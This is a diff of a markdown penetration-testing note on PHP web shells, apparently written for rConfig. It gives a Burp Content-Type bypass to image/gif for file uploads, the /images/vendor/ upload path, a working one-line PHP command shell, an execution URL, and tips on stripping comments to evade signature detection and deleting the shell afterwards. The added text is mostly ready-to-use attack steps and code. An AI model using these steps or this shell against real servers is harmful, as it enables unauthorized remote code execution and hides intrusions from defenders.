@@ -1,38 +1,33 @@
-## Methodology
+# PHP Web Shells
 
-1. Identify PHP backend through file extensions or server headers.
-2. Locate authenticated file upload fields in administrative menus.
-3. Capture the upload request and test for **Content-Type** validation bypass.
-4. Locate the uploaded payload in predictable directories to trigger execution.
-5. Upgrade the non-interactive web shell to a reverse shell for stability.
-6. Delete the uploaded payload immediately to avoid detection.
+Practical flow: find PHP app → identify upload function → bypass file type restriction → navigate to shell.
 
----
-
-## Bypassing File Type Restrictions
-
-Application allows image uploads but rejects `.php` files. Required when the server performs client-side or basic header-based validation.
-
-Modify the request header to mimic a valid image type
+File type bypass via Burp — intercept the upload POST, change `Content-Type: application/x-php` to `Content-Type: image/gif`, forward:
 
 ```
 Content-Type: image/gif
 ```
 
-> ⚠️ Gap: The source assumes the upload directory is known or guessable; if the application randomizes filenames or hides the upload path, execution will fail.
+Shell lands at whatever path the app stores uploads — check the response or app behavior to find it. For rConfig: `/images/vendor/<SHELL>.php`
 
-**Failure to remove author comments** from the payload source code can trigger signature-based detection or provide attribution to the attacker.
+Minimal PHP web shell if you need a one-liner instead of a full framework shell:
 
-## Web Shell Execution
-
-File upload successful but code does not execute automatically. Requires navigating to the static resource path.
-
-Access the uploaded shell via the browser or CLI
-
-```
-curl http://<TARGET_IP>/images/vendor/<FILE_NAME>.php
+```php
+<?php system($_GET['cmd']); ?>
 ```
 
-**Leaving the web shell on disk** after the engagement period or during a stealth assessment leads to discovery and potential attribution.
+Execute via URL:
 
-**Direct browser execution** often results in a non-interactive shell, limiting complex command execution.
+```
+http://<TARGET>/images/vendor/<SHELL>.php?cmd=id
+```
+
+---
+
+### Post-Upload Checklist
+
+Upgrade to reverse shell immediately — don't work through the browser. Delete the web shell file after establishing the reverse shell. Document the filename, upload path, and hash in your notes for the report.
+
+> [!warning] Web shells get auto-deleted on some apps after a set time. Non-interactive shells break command chaining (`&&`, pipes may not work). Establish a proper reverse shell before doing any real post-ex work.
+
+> [!tip] Strip all comments from the PHP file before uploading — author credits and usage notes in web shells are commonly signatured. A clean `<?php system($_GET['cmd']); ?>` is less detectable than WhiteWinterWolf's full commented version.
